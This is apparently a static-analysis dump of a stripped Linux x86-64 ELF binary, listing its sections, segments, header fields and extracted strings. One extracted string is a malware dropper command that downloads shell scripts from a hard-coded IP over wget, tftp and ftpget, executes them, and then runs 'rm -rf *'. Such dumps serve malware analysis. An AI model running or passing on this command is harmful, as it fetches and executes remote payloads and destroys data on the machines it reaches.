Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000     0x0 0x00000000     0x0 ---- 
1   0x000000e8    0x13 0x004000e8    0x13 -r-x .init
2   0x00000100  0xc6f8 0x00400100  0xc6f8 -r-x .text
3   0x0000c7f8     0xe 0x0040c7f8     0xe -r-x .fini
4   0x0000c820  0x24d0 0x0040c820  0x24d0 -r-- .rodata
5   0x0000ecf0     0x4 0x0040ecf0     0x4 -r-- .eh_frame
6   0x0000f000    0x10 0x0050f000    0x10 -rw- .ctors
7   0x0000f010    0x10 0x0050f010    0x10 -rw- .dtors
8   0x0000f020     0x8 0x0050f020     0x8 -rw- .jcr
9   0x0000f040   0x510 0x0050f040   0x510 -rw- .data
10  0x0000f550     0x0 0x0050f560  0x68e8 -rw- .bss
11  0x0000f550   0x8b8 0x00000000   0x8b8 ---- .comment
12  0x0000fe08    0x56 0x00000000    0x56 ---- .shstrtab

[Segments]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000  0xecf4 0x00400000  0xecf4 -r-x LOAD0
1   0x0000f000   0x550 0x0050f000  0x6e48 -rw- LOAD1
2   0x00000000     0x0 0x00000000     0x0 -rw- GNU_STACK
3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr

[Entrypoints]
vaddr=0x00400194 paddr=0x00000194 haddr=0x00000018 hvaddr=0x00400018 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000c820 0x0040c820 409 410  .rodata ascii   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.233.129/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 206.189.233.129 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.233.129; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.233.129 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n
161 0x0000e47b 0x0040e47b 15  16   .rodata ascii   Network is down
162 0x0000e48b 0x0040e48b 22  23   .rodata ascii   Network is unreachable
163 0x0000e4a2 0x0040e4a2 35  36   .rodata ascii   Network dropped connection on reset
164 0x0000e4c6 0x0040e4c6 32  33   .rodata ascii   Software caused connection abort
165 0x0000e4e7 0x0040e4e7 24  25   .rodata ascii   Connection reset by peer
166 0x0000e500 0x0040e500 25  26   .rodata ascii   No buffer space available
167 0x0000e51a 0x0040e51a 39  40   .rodata ascii   Transport endpoint is already connected
168 0x0000e542 0x0040e542 35  36   .rodata ascii   Transport endpoint is not connected
169 0x0000e566 0x0040e566 45  46   .rodata ascii   Cannot send after transport endpoint shutdown
170 0x0000e594 0x0040e594 34  35   .rodata ascii   Too many references: cannot splice
171 0x0000e5b7 0x0040e5b7 20  21   .rodata ascii   Connection timed out
172 0x0000e5cc 0x0040e5cc 18  19   .rodata ascii   Connection refused
173 0x0000e5df 0x0040e5df 12  13   .rodata ascii   Host is down
174 0x0000e5ec 0x0040e5ec 16  17   .rodata ascii   No route to host
175 0x0000e5fd 0x0040e5fd 29  30   .rodata ascii   Operation already in progress
176 0x0000e61b 0x0040e61b 25  26   .rodata ascii   Operation now in progress
177 0x0000e635 0x0040e635 21  22   .rodata ascii   Stale NFS file handle
178 0x0000e64b 0x0040e64b 24  25   .rodata ascii   Structure needs cleaning
179 0x0000e664 0x0040e664 27  28   .rodata ascii   Not a XENIX named type file
180 0x0000e680 0x0040e680 29  30   .rodata ascii   No XENIX semaphores available
181 0x0000e69e 0x0040e69e 20  21   .rodata ascii   Is a named type file
182 0x0000e6b3 0x0040e6b3 16  17   .rodata ascii   Remote I/O error
183 0x0000e6c4 0x0040e6c4 19  20   .rodata ascii   Disk quota exceeded
184 0x0000e6d8 0x0040e6d8 15  16   .rodata ascii   No medium found
185 0x0000e6e8 0x0040e6e8 17  18   .rodata ascii   Wrong medium type
186 0x0000ebd8 0x0040ebd8 9   10   .rodata ascii   /dev/null
187 0x0000ebeb 0x0040ebeb 5   6    .rodata ascii   L(knN
0   0x0000f514 0x0050f514 6   9    .data   utf8    箂CAk[S blocks=CJK Unified Ideographs,Basic Latin
arch     x86
baddr    0x400000
binsz    65118
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (GNU) 4.1.2
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  false
lsyms    false
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   false
rpath    NONE
sanitize false
static   true
stripped true
subsys   linux
va       true
0x00000000  ELF64       0x464c457f
0x00000010  Type        0x0002
0x00000012  Machine     0x003e
0x00000014  Version     0x00000001
0x00000018  Entrypoint  0x00400194
0x00000020  PhOff       0x00000040
0x00000028  ShOff       0x0000fe60
0x00000030  Flags       0x00000000
0x00000034  EhSize      64
0x00000036  PhentSize   56
0x00000038  PhNum       3
0x0000003a  ShentSize   64
0x0000003c  ShNum       13
0x0000003e  ShrStrndx   12
[Linked libraries]

0 library
[Relocations]

vaddr paddr type name
―――――――――――――――――――――


0 relocations
65118
Section to Segment mapping:
Segment   Section
-----------------
LOAD0     .init .text .fini .rodata .eh_frame 
LOAD1     .ctors .dtors .jcr .data 
GNU_STACK 
ehdr      


